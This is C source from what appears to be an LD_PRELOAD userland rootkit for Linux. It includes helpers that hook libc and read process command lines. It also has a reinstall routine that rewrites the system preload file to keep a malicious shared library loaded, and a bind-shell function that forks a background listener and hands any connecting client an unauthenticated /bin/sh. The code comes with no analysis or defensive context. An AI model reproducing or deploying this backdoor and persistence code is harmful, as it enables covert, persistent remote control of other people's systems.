char *gdirname(DIR *dirp)
{
    int fd;
    char fd_path[256], *filename=(char *)malloc(256);

    memset(filename, 0, 256);
    fd=dirfd(dirp);
    snprintf(fd_path, 255, "/proc/self/fd/%d", fd);
    if(readlink(fd_path, filename, 255) < 0) return NULL;
    return filename;
}

char *cprocname(void)
{
    HOOK(o_fopen,"fopen");
    char *pname=(char *)malloc(512);
    FILE *cmdline=o_fopen("/proc/self/cmdline","r");
    if(cmdline==NULL) return "bash";
    (void) fread(pname,255,1,cmdline);
    (void) fclose(cmdline);
    return pname;
}

char *gcmdline(void)
{
    HOOK(o_open,"open");
    HOOK(o_read,"read");
    char *cmdline=malloc(2048),path[256];
    int i, c, fd;
    snprintf(path, sizeof(path), "/proc/self/cmdline");
    if((fd=o_open(path,0,0)) < 0) snprintf(cmdline,5,"bash");
    else{
        c=o_read(fd,cmdline,sizeof(cmdline));
        for(i=0;i<c;i++) if(cmdline[i]==0x00) cmdline[i]=0x20;
    }
    if(fd) (void) close(fd);
    return cmdline;
}

void reinstall(void)
{   
    FILE *preload;
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(stat));

    HOOK(o_xstat,"__xstat");
    (void) o_xstat(_STAT_VER, LDSP, &s_fstat);

    HOOK(o_access,"access");
    if(s_fstat.st_size != strlen(SOPATH) || o_access(LDSP, F_OK) == -1)
    {
        HOOK(o_fopen,"fopen");
        if((preload=o_fopen(LDSP,"w")))
        {
            (void) fwrite(SOPATH, strlen(SOPATH), 1, preload);
            (void) fflush(preload);
            (void) fclose(preload);
            HOOK(o_chown,"chown");
            (void) o_chown(LDSP,0,MGID);
        }
    }
}

int sfd,rc,scli;
void commit_btermicide(void)
{
    (void) shutdown(sfd,SHUT_RDWR);
    (void) close(sfd);
    (void) shutdown(rc,SHUT_RDWR);
    (void) close(rc);
}
int create_bind_shell(int port)
{
    sfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(sfd<0) return -1;

    struct sockaddr_in us,them;
    memset(&us,0,sizeof(us));
    us.sin_family=AF_INET;
    us.sin_port=htons(port);
    us.sin_addr.s_addr=htonl(INADDR_ANY);

    rc=bind(sfd,(struct sockaddr *)&us, sizeof(us));
    if(rc != 0) return -1;

    if(fork() == 0)
    {
        (void) setpgrp();
        rc=listen(sfd,5);
        if(rc != 0) exit(0);

        (void) signal(SIGTERM,(sighandler_t)commit_btermicide);
        while(1)
        {
            socklen_t slen=sizeof(them);
            scli=accept(sfd, (struct sockaddr *)&them, &slen);
            if(scli<0) exit(0);

            int x;
            for(x=2;x>=0;x--) dup2(scli,x);
            (void) send(scli, S_MSG, strlen(S_MSG), 0);
            (void) execl("/bin/sh", "sh", NULL);
            (void) close(scli);
        }
        (void) close(scli);
        exit(0);
    }else{
        (void) signal(SIGCHLD,SIG_IGN);
        return 1;
    }
}